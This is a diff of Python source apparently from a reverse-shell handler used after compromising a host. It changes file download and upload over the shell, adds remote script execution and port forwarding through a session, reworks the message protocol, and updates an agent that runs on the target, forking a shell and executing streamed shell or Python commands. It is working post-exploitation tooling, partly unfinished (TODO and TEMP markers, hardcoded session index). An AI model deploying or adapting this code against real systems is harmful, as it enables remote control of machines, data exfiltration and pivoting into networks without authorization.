-					f'{paint("--- Need to get ").blue}{paint().yellow_DIM}{send_size:,}{paint().blue_NORMAL} '
-					f'bytes... They will be {paint().green_DIM}{actual_size:,}{paint().blue_NORMAL} when unpacked.'
-				)
-
-				# Check for local available space
-				need = actual_size - available_bytes
-				if need > 0:
-					logger.error("Not enough space to download")
-					logger.info(paint(f"--- We need {paint().yellow_DIM}{need:,}{paint().blue_NORMAL} more bytes...").blue)
-					self.responses.get() # just consume
-					return []
-
-				progress_bar.end = send_size
-
-				if not self.agent:
-					self.control_session.progress_recv_queue = queue.Queue()
-
-					data = io.BytesIO()
-					for offset in range(0, send_size, options.download_chunk_size):
-						response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}")
-						if response is False:
-							progress_bar.terminate()
-							logger.error("Download interrupted")
-							return []
-						progress_bar.update(len(response))
-						data.write(response)
-
-					data = base64.b64decode(data.getvalue())
-					self.exec(f"rm {temp}")
-				else:
-					while progress_bar.active:
-						received = self.control_session.progress_recv_queue.get()
-						progress_bar.update(received)
-					del self.control_session.progress_recv_queue
-
-					data = self.responses.get()
-
-				logger.info(paint('--- Local unpacking...').blue)
-				if not data:
-					logger.error("Corrupted response")
-					return []
-
-				tar = tarfile.open(fileobj=io.BytesIO(data))
-
-				items = tar.getnames()
-				if not items:
-					logger.warning("The item does not exist or access is denied")
-					return []
-
-				top_level_items = { re.match(f'[^{os.path.sep}]*', item)[0] for item in items }
-
-				for item in top_level_items:
-					local_item_path = local_download_folder / item
-					if local_item_path.exists():
-						new_path = local_item_path
-						while new_path.exists():
-							new_path = Path(str(new_path) + "_")
-						local_item_path.rename(new_path)
-						logger.debug(f"{local_item_path} exists. Renamed to {new_path}")
-
-				tar.extractall(local_download_folder)
-				downloaded = [local_download_folder / item for item in items]
-
-				specified = set()
-				for glob in remote_globs:
-					specified.update(set(local_download_folder.glob(glob.lstrip('/'))))
-				specified = specified.intersection(downloaded)
-
-				for item in specified:
-					logger.info(f"Downloaded => {paint(shlex.quote(pathlink(item))).yellow}") # PROBLEM with ../ TODO
-
-				return specified
-
-			except Exception as e:
-				logger.error(e)
-				return []
+			return downloaded
 
 		elif self.OS == 'Windows':
 			'''tempfile = f"{self.tmp}\\{rand(10)}.zip"
 
-			#cmd = f"certutil -encode {remote_item_path} {tempfile} > nul && type {tempfile} && del {tempfile}"
+			#cmd = f"certutil -encode {remote_items} {tempfile} > nul && type {tempfile} && del {tempfile}"
 			#data = base64.b64decode(b''.join(data.splitlines()[2:-1]))
 			#cmd = psh
 
 			cmd = (
-				f'powershell -command "compress-archive -path \\"{remote_item_path}\\" -DestinationPath \\"{tempfile}\\"";'
+				f'powershell -command "compress-archive -path \\"{remote_items}\\" -DestinationPath \\"{tempfile}\\"";'
 				'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
 				'Remove-Item $archivepath;'
 				'Write-Host $b64"'
@@ -2227,198 +2440,232 @@ class Session:
 			except binascii.Error:
 				logger.error("The item does not exist or access is denied")'''
 
-			logger.warning("Upload on Windows shells is not implemented yet")
+			logger.warning("Download on Windows shells is not implemented yet")
 
-	def upload(self, local_item_path, remote_path=None, randomize_fname=False, pipe=None):
+	def upload(self, local_items, remote_path=None, randomize_fname=False):
 
-		destination = remote_path if remote_path else self.cwd
+		# Initialization
+		try:
+			local_items = shlex.split(local_items)
+		except ValueError as e:
+			logger.error(e)
+			return []
 
-		if self.OS == 'Unix':
-			if not self.agent:
-				# Check if we can upload
-				dependencies = ['echo', 'base64', 'tar', 'rm']
-				for binary in dependencies:
-					if not self.bin[binary]:
-						logger.error(f"'{binary}' binary is not available at the target. Cannot upload...")
-						return []
-
-			local_item_path = os.path.expanduser(local_item_path)
-			data = io.BytesIO()
-			tar = tarfile.open(mode='w:gz', fileobj=data, format=tarfile.GNU_FORMAT)
-
-			if re.match('(http|ftp)s?://', local_item_path, re.IGNORECASE):
-
-				# URLs with special treatment
-				local_item_path = re.sub(
-					"https://www.exploit-db.com/exploits/",
-					"https://www.exploit-db.com/download/",
-					local_item_path
-				)
-
-				req = urllib.request.Request(local_item_path, headers={'User-Agent':options.useragent})
-
-				logger.info(paint(f"--- ⇣  Downloading {local_item_path}").blue)
-				ctx = ssl.create_default_context() if options.verify_ssl_cert else ssl._create_unverified_context()
-
-				while True:
-					try:
-						response = urllib.request.urlopen(req, context=ctx, timeout=options.short_timeout)
-						break
-					except urllib.error.HTTPError as e:
-						logger.error(e)
-					except urllib.error.URLError as e:
-						logger.error(e.reason)
-						if type(e.reason) == ssl.SSLCertVerificationError:
-							answer = ask("Cannot verify SSL Certificate. Download anyway? (y/N)")
-							if answer.lower() == 'y': # Trust the cert
-								ctx = ssl._create_unverified_context()
-								continue
-						else:
-							answer = ask("Connection error. Try again? (Y/n)")
-							if answer.lower() == 'n': # Trust the cert
-								pass
-							else:
-								continue
+		# Check for necessary binaries
+		if self.OS == 'Unix' and not self.agent:
+			dependencies = ['echo', 'base64', 'tar', 'rm']
+			for binary in dependencies:
+				if not self.bin[binary]:
+					logger.error(f"'{binary}' binary is not available at the target. Cannot upload...")
 					return []
 
-				filename = response.headers.get_filename()
-				items = [response.read()]
+		destination = remote_path or self.cwd
 
-			elif local_item_path.startswith(os.path.sep):
-				items = list(Path(os.path.sep).glob(local_item_path.lstrip(os.path.sep)))
-			else:
-				items = list(Path().glob(local_item_path))
+		# Resolve items
+		resolved_items = []
+		for item in local_items:
+			# Download URL
+			if re.match('(http|ftp)s?://', item, re.IGNORECASE):
+				try:
+					filename, item = url_to_bytes(item)
+					resolved_items.append((filename, item))
+				except Exception as e:
+					logger.error(e)
 
-			if not items:
-				logger.warning(f"No such file or directory: {shlex.quote(local_item_path)}")
-				return []
-
-			if pipe and len(items) > 1:
-				logger.warning(f"Only one script at a time please...")
-				return []
-
-			logger.info(paint("--- Local packing...").blue)
-
-			altnames = []
-			for item in items:
-
-				if isinstance(item, bytes):
-					name = Path(filename.strip('"')) if filename else Path(local_item_path.split('/')[-1])
-					altname = f"{name.stem}-{rand(8)}{name.suffix}" if randomize_fname else name.name
-
-					file = tarfile.TarInfo(name=altname)
-					file.size = len(item)
-					file.mode = 0o770
-					file.mtime = int(time.time())
-
-					tar.addfile(file, io.BytesIO(item))
-
+			elif item.startswith(os.path.sep):
+				items = list(Path(os.path.sep).glob(item.lstrip(os.path.sep)))
+				if items:
+					resolved_items.extend(items)
 				else:
-					def handle_exceptions(func):
-						def inner(*args, **kwargs):
-							try:
-								func(*args, **kwargs)
-							except Exception as e:
-								logger.error(e)
-						return inner
-
-					tar.add = handle_exceptions(tar.add)
-					altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
-
-					tar.add(item, arcname=altname)
-
-				altnames.append(altname)
-				logger.debug(f"Added {altname} to archive")
-
-			actual_size = sum([item.size for item in tar])
-			if not actual_size:
-				return []
-			tar.close()
-
-			data.seek(0)
-			data = data.read() if self.agent else base64.b64encode(data.read())
-			send_size = len(data)
-
-			logger.info(
-				f'{paint("--- Need to send ").blue}{paint().yellow_DIM}{send_size:,}{paint().blue_NORMAL} '
-				f'bytes... They will be {paint().green_DIM}{actual_size:,}{paint().blue_NORMAL} when unpacked.'
-			)
-
-			# Check remote space
-			if self.agent:
-				self.send(Messenger.message(Messenger.PYTHON_EXEC, 
-					b"stats = os.statvfs('.'); result = stats.f_bavail * stats.f_frsize"))
-				available_space = int(self.responses.get())
+					logger.error(f"No such file or directory: {item}")
 			else:
-				available_space = int(self.exec("df --block-size=1 .|tail -1|awk '{print $4}'", value=True))
+				items = list(Path().glob(item))
+				if items:
+					resolved_items.extend(items)
+				else:
+					logger.error(f"No such file or directory: {item}")
 
-			need = actual_size - available_space
+		#item = os.path.expanduser(item) # TOCHECK
 
+		if self.OS == 'Unix':
+			# Get remote available space
+			if self.agent:
+				response = self.exec(f"""
+				stats = os.statvfs('{destination}')
+				stdout_stream << (str(stats.f_bavail) + ';' + str(stats.f_frsize)).encode()
+				""", python=True, value=True, preserve_dir=True)
+
+				remote_available_blocks, remote_block_size = map(int, response.split(';'))
+				remote_space = remote_available_blocks * remote_block_size
+			else:
+				remote_space = int(self.exec(f"df --block-size=1 {destination}|tail -1|awk '{{print $4}}'", value=True))
+
+			# Calculate local size
+			local_size = 0
+			for item in resolved_items:
+				if isinstance(item, tuple):
+					local_size += len(item[1])
+				else:
+					local_size += get_glob_size(str(item), remote_block_size)
+
+			# Check required space
+			need = local_size - remote_space
 			if need > 0:
-				logger.error("Not enough space on target")
-				logger.info(paint(f"--- We need {paint().yellow_DIM}{need:,}{paint().blue_NORMAL} more bytes...").blue)
+				logger.error(
+					f"--- Not enough space on target... {paint('We need ').blue}"
+					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
+				)
 				return []
 
 			# Start Uploading
-			progress_bar = PBar(send_size, f"{paint('[+] ').green}{paint('--- ⇥  Uploading').blue}", 35)
+			if self.agent:
+
+				stdin_stream = self.new_streamID
+				stderr_stream = self.new_streamID
+
+				if not all([stdin_stream, stderr_stream]):
+					return
+
+				code = r"""
+				import tarfile
+				tar = tarfile.open(name='', mode='r|gz', fileobj=stdin_stream)
+				tar.extract = handle_exceptions(tar.extract, stderr_stream.id)
+				tar.errorlevel = 1
+				for item in tar:
+					tar.extract(item)
+				tar.close()
+				stdin_stream.terminate()
+				"""
+				threading.Thread(target=self.exec, args=(code, ), kwargs={
+					'python': True,
+					'stdin_stream': stdin_stream,
+					'stderr_stream': stderr_stream,
+					'preserve_dir': True
+				}).start()
+
+				tar_destination, mode = stdin_stream, "r|gz"
+			else:
+				tar_buffer = io.BytesIO()
+				tar_destination, mode = tar_buffer, "r:gz"
+
+			tar = tarfile.open(mode='w|gz', fileobj=tar_destination, format=tarfile.GNU_FORMAT)
+			tar.add = handle_exceptions(tar.add)
+
+			altnames = []
+			for item in resolved_items:
+				if isinstance(item, tuple):
+					filename, data = item
+
+					if randomize_fname:
+						filename = Path(filename)
+						altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
+					else:
+						altname = filename
+
+					file = tarfile.TarInfo(name=altname)
+					file.size = len(data)
+					file.mode = 0o770
+					file.mtime = int(time.time())
+
+					tar.addfile(file, io.BytesIO(data))
+				else:
+					altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
+					tar.add(item, arcname=altname)
+
+				altnames.append(altname)
+
+			tar.close()
 
 			if self.agent:
-				if pipe:
-					self.send(Messenger.message(Messenger.PYTHON_EXEC, f"agent.pipe_name = '{pipe}'".encode()))
-				else:
-					self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{destination}')".encode()))
+				stdin_stream.write(b"") # TO CHECK
+				stdin_stream.terminate()
 
-				self.control_session.progress_send_queue = queue.Queue()
-				self.send(Messenger.message(Messenger.UPLOAD, data))
-
-				while progress_bar.active:
-					sent = self.control_session.progress_send_queue.get()
-					progress_bar.update(sent)
-				del self.control_session.progress_send_queue
-
-				logger.info(paint("--- Remote unpacking...").blue)
-				response = self.responses.get().decode()
-				exit_code = self.responses.get()
-
-			else:
+				error_buffer = ''
+				while True:
+					r, _, _ = select.select([stderr_stream], [], [])
+					data = stderr_stream.read(NET_BUF_SIZE)
+					if data:
+						error_buffer += data.decode()
+						while '\n' in error_buffer:
+							line, error_buffer = error_buffer.split('\n', 1)
+							logger.error(line)
+					else:
+						break
+			else: # TODO
+				tar_buffer.seek(0)
+				data = base64.b64encode(tar_buffer.read()).decode()
 				temp = self.tmp + "/" + rand(8)
 
-				for chunk in chunks(data.decode(), options.upload_chunk_size):
+				for chunk in chunks(data, options.upload_chunk_size):
 					response = self.exec(f"echo -n {chunk} >> {temp}")
 					if response is False:
-						progress_bar.terminate()
+						#progress_bar.terminate()
 						logger.error("Upload interrupted")
-						return []
-					progress_bar.update(len(chunk))
+						return [] # TODO
+					#progress_bar.update(len(chunk))
 
-				logger.info(paint("--- Remote unpacking...").blue)
+				#logger.info(paint("--- Remote unpacking...").blue)
 				dest = f"-C {remote_path}" if remote_path else ""
 				cmd = f"base64 -d {temp} | tar xz {dest} 2>&1; temp=$?"
 				response = self.exec(cmd, value=True, preserve_dir=True)
 				exit_code = self.exec("echo $temp", value=True)
 				self.exec(f"rm {temp}")
 
-			if not pipe:
-				altnames = list(map(lambda x: destination + ('/' if self.OS == 'Unix' else '\\') + x, altnames))
+			# Present uploaded
+			altnames = list(map(lambda x: destination + ('/' if self.OS == 'Unix' else '\\') + x, altnames))
 
-				if not int(exit_code):
-					for item in altnames:
-						logger.info(f"Uploaded => {paint(shlex.quote(str(item))).yellow}")
-				else:
-					logger.error(f"Upload failed")
-					print(paint(textwrap.indent(response, " *  ")).yellow)
-					return []
-
-				return altnames
-			else:
-				logger.info(
-					f"{paint('💉 Injected ').blue}{paint(local_item_path).yellow_DIM}"
-					f"{paint().blue_NORMAL} to target's {paint('memory').red_DIM}"
-				)
-				return True
+			for item in altnames:
+				logger.info(f"{paint('Uploaded').GREEN_white} => {paint(shlex.quote(str(item))).yellow}")
+			return altnames
 
 		elif self.OS == 'Windows':
 			logger.warning("Upload on Windows shells is not implemented yet")
+
+	def script(self, local_script):
+		local_script_folder = self.directory / "scripts"
+		prefix = datetime.now().strftime("%Y_%m_%d-%H_%M_%S-")
+
+		try:
+			local_script_folder.mkdir(parents=True, exist_ok=True)
+		except Exception as e:
+			logger.error(e)
+			return False
+
+		if re.match('(http|ftp)s?://', local_script, re.IGNORECASE):
+			try:
+				filename, data = url_to_bytes(local_script)
+			except Exception as e:
+				logger.error(e)
+
+			local_script = local_script_folder / (prefix + filename)
+			with open(local_script, "wb") as input_file:
+				input_file.write(data)
+		else:
+			local_script = Path(local_script)
+
+		output_file_name = local_script_folder / (prefix + "output.txt")
+
+		try:
+			with open(local_script, "rb") as input_file, open(output_file_name, "wb") as output_file:
+
+				first_line = input_file.readline().strip()
+				input_file.seek(0) # Maybe it is not needed
+				if first_line.startswith(b'#!'):
+					program = first_line[2:].decode()
+				else:
+					logger.error("No shebang found")
+					return False
+
+				tail_cmd = f'\ntail -n+0 -f {output_file_name}'
+				Open(tail_cmd, terminal=True)
+				print(tail_cmd)
+
+				self.exec(program, stdin_src=input_file, stdout_dst=output_file, stderr_dst=output_file, preserve_dir=True)
+		except Exception as e:
+			logger.error(e)
+			return False
+
+		return True
 
 	def spawn(self, port=None, host=None):
 		#print(threading.current_thread().name)
@@ -2473,58 +2720,120 @@ class Session:
 
 		return True
 
-	def task(self, cmd, _stdout=None, _stderr=None, localscript=None):
-		if self.OS == "Unix":
-			if self.agent:
-				local_task_folder = self.directory / "tasks"
-				try:
-					local_task_folder.mkdir(parents=True, exist_ok=True)
-				except Exception as e:
-					logger.error(e)
-					return False
+	def portfwd(self, _type, lhost, lport, rhost, rport):
 
-				taskid = rand(8)
-				while taskid in self.tasks:
-					taskid = rand(8)
+		#print(_type, lhost, lport, rhost, rport)
+		class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
+			def handle(self):
 
-				if _stdout:
-					outfile = self.directory / "tasks" / _stdout
-				else:
-					outfile = self.directory / "tasks" / (taskid + ".out")
-				if _stderr:
-					errfile = self.directory / "tasks" / _stderr
-				else:
-					errfile = outfile
+				#self.request.setblocking(False)
 
-				if localscript:
-					if not self.upload(cmd, pipe=taskid):
-						return False
-					cmd = self.responses.get().decode()
+				stdin_stream = core.sessions[1].new_streamID # TEMP
+				stdout_stream = core.sessions[1].new_streamID
+				stderr_stream = core.sessions[1].new_streamID
 
-				self.tasks[taskid] = {
-					'command':cmd,
-					'streams':{
-						"1": open(outfile, "ab", buffering=0),
-						"2": open(errfile, "ab", buffering=0)
-					}
-				}
-				self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{self.cwd}')".encode()))
-				self.send(Messenger.message(Messenger.TASK, (taskid + cmd).encode()))
-				self.tasks[taskid]['pid'] = self.responses.get().decode()
+				if not all([stdin_stream, stdout_stream, stderr_stream]):
+					return
 
-				logger.info(
-					f"Task assigned with ID: {paint(taskid).yellow} "
-					f"{paint('(PID: ' + self.tasks[taskid]['pid'] + ')').cyan_DIM}"
+				code = rf"""
+				import socket
+				client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				frlist = [stdin_stream]
+				connected = False
+				while True:
+					readables, _, _ = select.select(frlist, [], [])
+
+					for readable in readables:
+						if readable is stdin_stream:
+							data = stdin_stream.read(NET_BUF_SIZE)
+							if not connected:
+								client.connect(("{rhost}", {rport}))
+								frlist.append(client)
+								connected = True
+								#client.setblocking(False)
+							try:
+								client.sendall(data)
+							except OSError:
+								break
+							if not data:
+								frlist.remove(stdin_stream)
+
+						if readable is client:
+							try:
+								data = client.recv(NET_BUF_SIZE)
+								stdout_stream.write(data)
+								if not data:
+									frlist.remove(client) # TEMP
+									break
+							except OSError:
+								frlist.remove(client) # TEMP
+								break
+
+					else:
+						continue
+					break
+				client.close()
+				"""
+
+				core.sessions[1].exec(
+					code,
+					python=True,
+					stdin_stream=stdin_stream,
+					stdout_stream=stdout_stream,
+					stderr_stream=stderr_stream,
+					stdin_src=self.request,
+					stdout_dst=self.request
 				)
-				return self.tasks[taskid]
-			else:
-				logger.warning("Please upgrade the shell first") #TEMP
-				return False
 
-		elif self.OS == 'Windows':
-			logger.warning("Tasks in Windows shells are not implemented yet")
+				"""threading.Thread(target=core.sessions[1].exec, args=(code, ), kwargs={
+					'python': True,
+					'stdin_stream': stdin_stream,
+					'stdout_stream': stdout_stream,
+					'stderr_stream': stderr_stream
+				}).start()
 
-		return True
+
+
+				rlist = [self.request, stdout_stream]
+				while True:
+					readables, _, _ = select.select(rlist, [], [])
+
+					for readable in readables:
+						if readable is stdout_stream:
+							data = stdout_stream.read(NET_BUF_SIZE)
+							try:
+								self.request.sendall(data)
+							except OSError:
+								break
+							if not data:
+								rlist.remove(stdout_stream)
+
+						if readable is self.request:
+							try:
+								data = self.request.recv(NET_BUF_SIZE)
+							except OSError:
+								break
+							stdin_stream.write(data)
+							if not data:
+								break
+
+					else:
+						continue
+					break
+
+				#stderr_stream.terminate() # TEMP"""
+				#print("FWD Socket terminated")
+
+		class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
+			allow_reuse_address = True
+			request_queue_size = 100
+
+		def server_thread():
+			with ThreadedTCPServer((lhost, lport), ThreadedTCPRequestHandler) as server:
+				server.serve_forever()
+
+		threading.Thread(target=server_thread).start()
+
 
 	def maintain(self):
 		with core.lock:
@@ -2611,112 +2920,145 @@ class Session:
 class Messenger:
 	SHELL = 1
 	RESIZE = 2
-	UPLOAD = 3
-	DOWNLOAD = 4
-	PYTHON_EXEC = 5
-	SHELL_EXEC = 6
-	TASK = 7
-	TASK_RESPONSE = 8
-	RESPONSE = 9
+	EXEC = 3
+	STREAM = 4
 
-	LEN_BYTES = 4
+	STREAM_CODE = '!B'
+	STREAM_BYTES = struct.calcsize(STREAM_CODE)
+
+	LEN_CODE = 'H'
+	_LEN_CODE = '!' + 'H'
+	LEN_BYTES = struct.calcsize(LEN_CODE)
+
+	TYPE_CODE = 'B'
+	_TYPE_CODE = '!' + 'B'
+	TYPE_BYTES = struct.calcsize(TYPE_CODE)
+
+	HEADER_CODE = '!' + LEN_CODE + TYPE_CODE
 
 	def __init__(self, bufferclass):
-
-		self.len_got = 0
-		self.len_bytes = None
 		self.len = None
-
-		self.mess_got = 0
-		self.mess_last_got = 0
-
-		self.buffer = bufferclass()
-		self.message_buf = bufferclass()
+		self.input_buffer = bufferclass()
+		self.length_buffer = bufferclass()
+		self.message_buffer = bufferclass()
 
 	def message(_type, _data):
-		_len = len(_data)
-		return struct.pack('!IB' + str(_len) + 's', _len + 1, _type, _data)
+		return struct.pack(Messenger.HEADER_CODE, len(_data) + Messenger.TYPE_BYTES, _type) + _data
 	message = staticmethod(message)
 
 	def feed(self, data):
-		messages = []
-
-		position = self.buffer.tell()
-		self.buffer.seek(0, 2) # io.SEEK_END
-		self.buffer.write(data)
-		self.buffer.seek(position)
+		self.input_buffer.write(data)
+		self.input_buffer.seek(0)
 
 		while True:
 			if not self.len:
-				need = Messenger.LEN_BYTES - self.len_got
-
-				data = self.buffer.read(need)
-
-				if not data:
+				len_need = Messenger.LEN_BYTES - self.length_buffer.tell()
+				data = self.input_buffer.read(len_need)
+				self.length_buffer.write(data)
+				if len(data) != len_need:
 					break
-				self.len_got += len(data)
 
-				if not self.len_bytes:
-					self.len_bytes = data
-				else:
-					self.len_bytes += data
-
-				if self.len_got == Messenger.LEN_BYTES:
-					self.len = struct.unpack('!I', self.len_bytes)[0]
-
-			if self.len:
-				to_get = self.len - self.mess_got
-
-				data = self.buffer.read(to_get)
-
-				if not data:
+				self.len = struct.unpack(Messenger._LEN_CODE, self.length_buffer.getvalue())[0]
+				self.length_buffer.seek(0)
+				self.length_buffer.truncate()
+			else:
+				data_need = self.len - self.message_buffer.tell()
+				data = self.input_buffer.read(data_need)
+				self.message_buffer.write(data)
+				if len(data) != data_need:
 					break
-				self.mess_last_got = len(data)
-				self.mess_got += self.mess_last_got
 
-				self.message_buf.write(data)
+				self.message_buffer.seek(0)
+				_type = struct.unpack(Messenger._TYPE_CODE, self.message_buffer.read(Messenger.TYPE_BYTES))[0]
+				_message = self.message_buffer.read()
 
-				if self.mess_got == self.len:
-					self.len_got = 0
-					self.len_bytes = None
-					self.len = None
+				self.len = None
+				self.message_buffer.seek(0)
+				self.message_buffer.truncate()
+				yield _type, _message
 
-					self.mess_got = 0
+		self.input_buffer.seek(0)
+		self.input_buffer.truncate()
 
-					self.message_buf.seek(0)
-					_type = struct.unpack('!B', self.message_buf.read(1))[0]
-					_message = self.message_buf.read()
-					self.message_buf.seek(0)
-					self.message_buf.truncate(0)
 
-					messages.append((_type, _message))
-					#open("/tmp/" + "ppp2", "a").write(repr((_type, _message)) + "\n")
+class Stream:
+	def __init__(self, _id, _session=None):
+		self.id = _id
+		self._read, self._write = os.pipe()
+		self.writebuf = None
+		self.feed_thread = None
+		self.session = _session
 
-		self.buffer.seek(0)
-		self.buffer.truncate(0)
+		if self.session:
+			self.lock = self.session.stream_lock
+			self.pool = self.session.streams
+			self.writefunc = lambda data: self.session.send(Messenger.message(Messenger.STREAM, self.id + data))
+		else:
+			self.lock = None
+			self.pool = streams
+			self.writefunc = lambda data: respond(self.id + data)
+			flags = fcntl.fcntl(self._write, fcntl.F_GETFD) # TEMP FIX
+			fcntl.fcntl(self._write, fcntl.F_SETFD, flags | fcntl.FD_CLOEXEC)
 
-		return messages
+	def __lshift__(self, data):
+		if not self.writebuf:
+			self.writebuf = queue.Queue()
+		self.writebuf.put(data)
+		if not self.feed_thread:
+			self.feed_thread = threading.Thread(target=self.feed, name="feed stream -> " + repr(self.id))
+			self.feed_thread.start()
+
+	def feed(self):
+		while True:
+			data = self.writebuf.get()
+			if not data:
+				os.close(self._write)
+				break
+			try:
+				os.write(self._write, data)
+			except:
+				pass
+
+	def fileno(self):
+		return self._read
+
+	def write(self, data):
+		self.writefunc(data)
+
+	def read(self, n):
+		data = os.read(self._read, n)
+		if not data:
+			os.close(self._read)
+		return data
+
+	def terminate(self):
+		try:
+			if self.lock:
+				self.lock.acquire()
+			if self.id in self.pool:
+				del self.pool[self.id]
+			if self.lock:
+				self.lock.release()
+		except (OSError, KeyError):
+			pass
 
 
 def agent():
 	import os
-	import tty
 	import sys
 	import pty
-	import glob
+	import shlex
 	import fcntl
 	import select
 	import struct
 	import signal
 	import termios
-	import tarfile
-	import subprocess
-
 	import threading
 
-	SHELL = "{}"
-	NET_BUF_SIZE = 8192
-	{}
+	if sys.version_info[0] == 2:
+		import Queue as queue
+	else:
+		import queue
 	try:
 		import io
 		bufferclass = io.BytesIO
@@ -2724,54 +3066,65 @@ def agent():
 		import StringIO
 		bufferclass = StringIO.StringIO
 
-	messenger = Messenger(bufferclass)
-	outbuf = bufferclass()
-	ttybuf = bufferclass()
+	SHELL = "{}"
+	NET_BUF_SIZE = {}
+	{}
+	{}
 
-	def respond(_type, _value):
+	def respond(_value, _type=Messenger.STREAM):
+		wlock.acquire()
 		outbuf.seek(0, 2)
 		outbuf.write(Messenger.message(_type, _value))
 		if not pty.STDOUT_FILENO in wlist:
 			wlist.append(pty.STDOUT_FILENO)
+			os.write(control_in, "1".encode())
+		wlock.release()
 
-	def handle_exceptions(func):
+	def handle_exceptions(func, streamID):
 		def inner(*args, **kwargs):
 			try:
 				func(*args, **kwargs)
 			except:
 				_, e, _ = sys.exc_info()
-				respond(Messenger.RESPONSE, str(-2).encode())
-				respond(Messenger.RESPONSE, str(e).encode())
+				respond(streamID + (str(e) + '\n').encode())
 		return inner
 
-	def write_to_pipe(pipe, data):
-		os.write(pipe, data)
-		os.close(pipe)
-
-	pid, master_fd = pty.fork()
-	if pid == pty.CHILD:
-		os.execlp(SHELL, "-i") # TEMP # TODO
+	shell_pid, master_fd = pty.fork()
+	if shell_pid == pty.CHILD:
+		os.execl(SHELL, SHELL, '-i') # TEMP # TODO
 
 	try:
 		tasks = dict()
 		pipes = dict()
-		agent.pipe_name = None
-		rlist = [master_fd, pty.STDIN_FILENO]
+		streams = dict()
+
+		messenger = Messenger(bufferclass)
+		outbuf = bufferclass()
+		ttybuf = bufferclass()
+
+		wlock = threading.Lock()
+		control_out, control_in = os.pipe()
+		#flags = fcntl.fcntl(control_out, fcntl.F_GETFD)
+		#inheritance = bool(flags & fcntl.FD_CLOEXEC) # TODO
+		rlist = [control_out, master_fd, pty.STDIN_FILENO]
 		wlist = []
-		for fd in (master_fd, pty.STDIN_FILENO, pty.STDOUT_FILENO):
-			flags = fcntl.fcntl(fd, fcntl.F_GETFL)
-			fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
+		#for fd in (master_fd, pty.STDIN_FILENO, pty.STDOUT_FILENO): # TODO
+		#	flags = fcntl.fcntl(fd, fcntl.F_GETFL)
+		#	fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
 
 		while True:
 			rfds, wfds, xfds = select.select(rlist, wlist, [])
 
 			for readable in rfds:
-				if readable is master_fd:
-					data = os.read(master_fd, NET_BUF_SIZE)
-					if not data:
-						raise OSError
+				if readable is control_out:
+					os.read(control_out, 1)
 
-					respond(Messenger.SHELL, data)
+				elif readable is master_fd:
+					data = os.read(master_fd, NET_BUF_SIZE)
+					respond(data, Messenger.SHELL) # TOCHECK
+					if not data:
+						rlist.remove(master_fd)
+						os.close(master_fd)
 
 				elif readable is pty.STDIN_FILENO:
 					data = os.read(pty.STDIN_FILENO, NET_BUF_SIZE)
@@ -2780,6 +3133,7 @@ def agent():
 
 					messages = messenger.feed(data)
 					for _type, _value in messages:
+						#open("/tmp/" + "debug", "a").write(repr((_type, _value)) + "\n")
 						if _type == Messenger.SHELL:
 							ttybuf.seek(0, 2)
 							ttybuf.write(_value)
@@ -2789,114 +3143,91 @@ def agent():
 						elif _type == Messenger.RESIZE:
 							fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)
 
-						elif _type == Messenger.UPLOAD:
+						elif _type == Messenger.EXEC:
+							_type, stdin_stream_id, stdout_stream_id, stderr_stream_id, cmd = \
+							_value[:1], \
+							_value[1:Messenger.STREAM_BYTES + 1], \
+							_value[Messenger.STREAM_BYTES + 1:Messenger.STREAM_BYTES * 2 + 1], \
+							_value[Messenger.STREAM_BYTES * 2 + 1:Messenger.STREAM_BYTES * 3 + 1], \
+							_value[Messenger.STREAM_BYTES * 3 + 1:]
+
+							stdin_stream = Stream(stdin_stream_id)
+							stdout_stream = Stream(stdout_stream_id)
+							stderr_stream = Stream(stderr_stream_id)
+
+							streams[stdin_stream_id] = stdin_stream
+							streams[stdout_stream_id] = stdout_stream
+							streams[stderr_stream_id] = stderr_stream
+
+							rlist.append(stdout_stream)
+							rlist.append(stderr_stream)
+
+							if _type == 'S'.encode():
+								pid = os.fork()
+								if pid == 0:
+									#import resource
+									#for fd in range(resource.getrlimit(resource.RLIMIT_NOFILE)[0]):
+									#	if not fd in (stdin_stream._read, stdout_stream._write, stderr_stream._write):
+									#		try:
+									#			os.close(fd)
+									#		except:
+									#			pass
+									os.dup2(stdin_stream._read, 0)
+									os.dup2(stdout_stream._write, 1)
+									os.dup2(stderr_stream._write, 2)
+
+									os.execl("/bin/sh", "sh", "-c", cmd)
+									os._exit(1)
+
+								os.close(stdin_stream._read)
+								os.close(stdout_stream._write)
+								os.close(stderr_stream._write)
+
+							elif _type == 'P'.encode():
+								def run(stdin_stream, stdout_stream, stderr_stream):
+									try:
+										{}
+									except:
+										_, e, _ = sys.exc_info()
+										stderr_stream << str(e).encode()
+
+									stdout_stream << ""
+									stderr_stream << ""
+
+								threading.Thread(target=run, args=(stdin_stream, stdout_stream, stderr_stream)).start()
+
+						# Incoming streams
+						elif _type == Messenger.STREAM:
 							try:
-								data = bufferclass(_value)
-								tar = tarfile.open(name="", mode='r:gz', fileobj=data)
-								tar.errorlevel = 1
+								stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
+								streams[stream_id] << data
+								if not data:
+									streams[stream_id].terminate()
+							except KeyError:
+								pass
 
-								if not agent.pipe_name:
-									for item in tar:
-										tar.extract(item)
-								else:
-									pipes[agent.pipe_name.encode()] = os.pipe()
-									file = tar.extractfile(tar.members[0])
-
-									firstline = file.readline()[:-1]
-									if firstline[:2] == '#!'.encode():
-										shebang = firstline[2:]
-									else:
-										shebang = SHELL.encode()
-
-									file.seek(0)
-									data = file.read()
-									threading.Thread(
-										target=write_to_pipe,
-										args=(pipes[agent.pipe_name.encode()][1], data)
-										).start()
-								tar.close()
-
-							except: #TODO
-								_, e, _ = sys.exc_info()
-								respond(Messenger.RESPONSE, str(e).encode())
